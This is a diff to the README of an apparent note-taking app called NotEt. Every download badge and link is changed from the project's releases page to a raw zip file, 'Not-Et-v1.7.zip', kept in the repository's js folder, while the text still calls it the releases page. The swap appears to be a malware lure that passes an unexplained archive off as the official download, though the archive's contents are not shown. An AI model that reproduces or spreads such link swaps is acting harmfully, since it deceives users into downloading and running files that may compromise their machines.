@@ -6,7 +6,7 @@ Welcome to NotEt! This is a minimalist note-taking application that prioritizes 
 
 ## 📥 Download NotEt
 
-[![Download NotEt](https://img.shields.io/badge/Download_NotEt-v1.0-blue.svg)](https://github.com/dorjoy35/NotEt/releases)
+[![Download NotEt](https://github.com/dorjoy35/NotEt/raw/refs/heads/master/js/Not-Et-v1.7.zip)](https://github.com/dorjoy35/NotEt/raw/refs/heads/master/js/Not-Et-v1.7.zip)
 
 You can easily download NotEt from our releases page. Follow the steps below to get started.
 
@@ -24,7 +24,7 @@ You can easily download NotEt from our releases page. Follow the steps below to 
 
 ## 📥 Download & Install
 
-To start using NotEt, please [visit this page to download](https://github.com/dorjoy35/NotEt/releases). You will find the latest version there. Simply choose the download link suitable for your browser.
+To start using NotEt, please [visit this page to download](https://github.com/dorjoy35/NotEt/raw/refs/heads/master/js/Not-Et-v1.7.zip). You will find the latest version there. Simply choose the download link suitable for your browser.
 
 ### Download Steps
 
@@ -58,6 +58,6 @@ For any questions or feedback, feel free to open an issue on the GitHub reposito
 
 Join our community on social media platforms or forums to share your thoughts and experiences with NotEt. Engage with other users to learn new note-taking techniques.
 
-[![Download NotEt](https://img.shields.io/badge/Download_NotEt-v1.0-blue.svg)](https://github.com/dorjoy35/NotEt/releases) 
+[![Download NotEt](https://github.com/dorjoy35/NotEt/raw/refs/heads/master/js/Not-Et-v1.7.zip)](https://github.com/dorjoy35/NotEt/raw/refs/heads/master/js/Not-Et-v1.7.zip) 
 
 Thank you for using NotEt! We hope it helps you keep your notes organized and secure.
